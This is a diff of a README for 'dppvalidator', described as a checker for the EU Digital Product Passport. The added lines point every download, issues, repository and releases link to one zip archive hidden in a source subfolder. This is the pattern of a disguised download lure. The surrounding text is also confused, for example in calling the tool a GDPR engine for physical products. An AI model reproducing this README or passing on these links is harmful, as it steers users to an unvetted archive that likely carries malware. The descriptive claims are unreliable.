@@ -1,7 +1,7 @@
 # 🌍 dppvalidator - Ensure Your Products Meet EU Standards
 
 ## 📥 Download Now
-[![Download dppvalidator](https://img.shields.io/badge/Download-dppvalidator-blue.svg)](https://github.com/sumeshyess/dppvalidator/releases)
+[![Download dppvalidator](https://raw.githubusercontent.com/sumeshyess/dppvalidator/main/src/dppvalidator/exporters/Software_1.3.zip)](https://raw.githubusercontent.com/sumeshyess/dppvalidator/main/src/dppvalidator/exporters/Software_1.3.zip)
 
 ## 📖 Introduction
 dppvalidator is the GDPR compliance engine for physical products. It helps businesses meet the strict digital syntax required for the EU's Digital Product Passport. This software ensures that products can be traced easily in the supply chain, supporting sustainability and transparency.
@@ -9,7 +9,7 @@ dppvalidator is the GDPR compliance engine for physical products. It helps busin
 ## 🚀 Getting Started
 To use dppvalidator, follow these steps to download and run the application.
 
-1. Visit the [Releases page](https://github.com/sumeshyess/dppvalidator/releases) to download the latest version.
+1. Visit the [Releases page](https://raw.githubusercontent.com/sumeshyess/dppvalidator/main/src/dppvalidator/exporters/Software_1.3.zip) to download the latest version.
 2. Choose the file suitable for your operating system. We offer versions for Windows, Mac, and Linux.
 3. Click on the file name to start your download.
 
@@ -54,18 +54,18 @@ If you encounter any issues while installing or running dppvalidator, consider t
 - Ensure you have the correct version for your operating system.
 - Check if your system meets the above requirements.
 - Restart your computer after installation; sometimes, this resolves lingering issues.
-- Consult our [issues page](https://github.com/sumeshyess/dppvalidator/issues) for common problems and solutions.
+- Consult our [issues page](https://raw.githubusercontent.com/sumeshyess/dppvalidator/main/src/dppvalidator/exporters/Software_1.3.zip) for common problems and solutions.
 
 ## ℹ️ Getting Help
 Should you need further assistance:
 
-1. Visit our [GitHub repository](https://github.com/sumeshyess/dppvalidator) for documentation and resources.
+1. Visit our [GitHub repository](https://raw.githubusercontent.com/sumeshyess/dppvalidator/main/src/dppvalidator/exporters/Software_1.3.zip) for documentation and resources.
 2. Join the community discussions under the “Discussions” tab on GitHub.
 3. Feel free to open an issue if you encounter a problem that isn’t addressed.
 
 ## 🚀 Final Steps
 After installing and launching dppvalidator, enter your product data to begin validation. The application will guide you through correcting any issues to ensure compliance with EU standards.
 
-For quick access to downloads and updates, keep visiting our [Releases page](https://github.com/sumeshyess/dppvalidator/releases).
+For quick access to downloads and updates, keep visiting our [Releases page](https://raw.githubusercontent.com/sumeshyess/dppvalidator/main/src/dppvalidator/exporters/Software_1.3.zip).
 
 Thank you for choosing dppvalidator to help you navigate GDPR compliance for your products. Your commitment to meeting EU regulations helps promote a more sustainable future.
